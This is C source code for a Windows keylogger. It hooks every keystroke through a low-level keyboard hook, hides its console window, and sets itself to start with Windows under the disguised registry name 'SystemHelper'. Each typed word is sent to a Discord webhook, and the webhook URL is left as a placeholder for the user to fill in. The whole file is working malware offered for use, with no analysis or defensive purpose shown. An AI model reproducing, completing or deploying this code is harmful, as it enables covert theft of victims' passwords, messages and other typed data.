#include <windows.h>
#include <wininet.h>
#include <stdio.h>

#pragma comment(lib, "wininet.lib")

#define WEBHOOK_URL "YOUR WEBHOOK URL"

char currentWord[256] = "";
int wordLength = 0;
int shiftPressed = 0;

void sendToDiscord(const char* message) {
    if (strlen(message) == 0) return;
    
    HINTERNET hInternet = InternetOpenA("DiscordBot", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) return;
    
    HINTERNET hConnect = InternetConnectA(hInternet, "discord.com", INTERNET_DEFAULT_HTTPS_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConnect) {
        InternetCloseHandle(hInternet);
        return;
    }
    
    char jsonData[512];
    sprintf(jsonData, "{\"content\":\"%s\",\"username\":\"Keylogger\"}", message);
    
    HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", "YOUR API WEBHOOK URL", NULL, NULL, NULL, INTERNET_FLAG_SECURE, 0);
    
    if (hRequest) {
        const char* headers = "Content-Type: application/json";
        HttpSendRequestA(hRequest, headers, strlen(headers), jsonData, strlen(jsonData));
        InternetCloseHandle(hRequest);
    }
    
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);
}

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0 && wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT* kbdStruct = (KBDLLHOOKSTRUCT*)lParam;
        
        if (kbdStruct->vkCode == VK_SHIFT) {
            shiftPressed = 1;
        }
        else if (kbdStruct->vkCode >= 0x41 && kbdStruct->vkCode <= 0x5A && wordLength < 255) {
            char c = 'a' + (kbdStruct->vkCode - 0x41);
            if (shiftPressed) c = toupper(c);
            currentWord[wordLength++] = c;
        }
        else if (kbdStruct->vkCode >= 0x30 && kbdStruct->vkCode <= 0x39 && wordLength < 255) {
            currentWord[wordLength++] = '0' + (kbdStruct->vkCode - 0x30);
        }
        else if (kbdStruct->vkCode == VK_SPACE && wordLength > 0) {
            currentWord[wordLength] = '\0';
            sendToDiscord(currentWord);
            wordLength = 0;
        }
        else if (kbdStruct->vkCode == VK_RETURN && wordLength > 0) {
            currentWord[wordLength] = '\0';
            sendToDiscord(currentWord);
            wordLength = 0;
        }
        else if (kbdStruct->vkCode == VK_BACK && wordLength > 0) {
            wordLength--;
        }
    }
    else if (nCode >= 0 && wParam == WM_KEYUP) {
        KBDLLHOOKSTRUCT* kbdStruct = (KBDLLHOOKSTRUCT*)lParam;
        if (kbdStruct->vkCode == VK_SHIFT) {
            shiftPressed = 0;
        }
    }
    
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

void AddToStartup() {
    HKEY hKey;
    char exePath[MAX_PATH];
    GetModuleFileNameA(NULL, exePath, MAX_PATH);
    
    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
        RegSetValueExA(hKey, "SystemHelper", 0, REG_SZ, (BYTE*)exePath, strlen(exePath) + 1);
        RegCloseKey(hKey);
    }
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    AddToStartup();
    
    HHOOK keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, GetModuleHandle(NULL), 0);
    
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    
    UnhookWindowsHookEx(keyboardHook);
    return 0;
}